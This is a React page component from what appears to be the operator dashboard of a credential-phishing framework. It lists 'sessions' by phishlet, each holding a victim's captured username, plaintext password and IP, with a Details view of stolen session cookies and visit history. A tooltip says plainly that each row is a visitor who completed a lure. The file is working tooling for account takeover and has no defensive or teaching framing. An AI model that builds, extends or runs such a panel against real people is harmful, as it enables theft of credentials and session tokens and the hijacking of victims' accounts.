import React, { useEffect, useState } from 'react';
import { api } from '../lib/api.js';
import Info from '../components/Info.jsx';
import SessionDetail from '../components/SessionDetail.jsx';

export default function Sessions() {
  const [rows, setRows] = useState([]);
  const [error, setError] = useState('');
  const [detail, setDetail] = useState(null);

  function refresh() {
    api.get('/api/sessions').then((d) => setRows(d.rows)).catch((e) => setError(e.message));
  }
  useEffect(refresh, []);

  async function view(id) {
    try {
      const res = await api.get(`/api/sessions/${id}`);
      setDetail({ id, raw: res.raw, cookies: res.cookies });
    } catch (e) {
      setError(e.message);
    }
  }

  async function del(id) {
    if (!confirm(`Delete session ${id}?`)) return;
    await api.del(`/api/sessions/${id}`);
    if (detail?.id === id) setDetail(null);
    refresh();
  }

  return (
    <div className="stack">
      <h2>Sessions <Info text="Each row is one visitor who completed a lure — captured username/password and, when available, authentication tokens (session cookies) for that phishlet's login." /></h2>
      {error && <div className="error-text">{error}</div>}
      {detail && <SessionDetail {...detail} />}

      <div className="card">
        <div className="table-scroll">
        <table>
          <thead><tr><th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Remote IP</th><th></th></tr></thead>
          <tbody>
            {rows.map((r, i) => (
              <tr key={i}>
                <td>{r.id}</td><td>{r.phishlet}</td><td>{r.username}</td><td>{r.password}</td><td>{r.remote_ip}</td>
                <td className="row">
                  <button onClick={() => view(r.id)} title="Show captured auth tokens and full visit history">Details</button>
                  <button className="danger" onClick={() => del(r.id)}>Delete</button>
                </td>
              </tr>
            ))}
            {rows.length === 0 && <tr><td colSpan={6} className="dim">No sessions captured yet.</td></tr>}
          </tbody>
        </table>
        </div>
      </div>
    </div>
  );
}
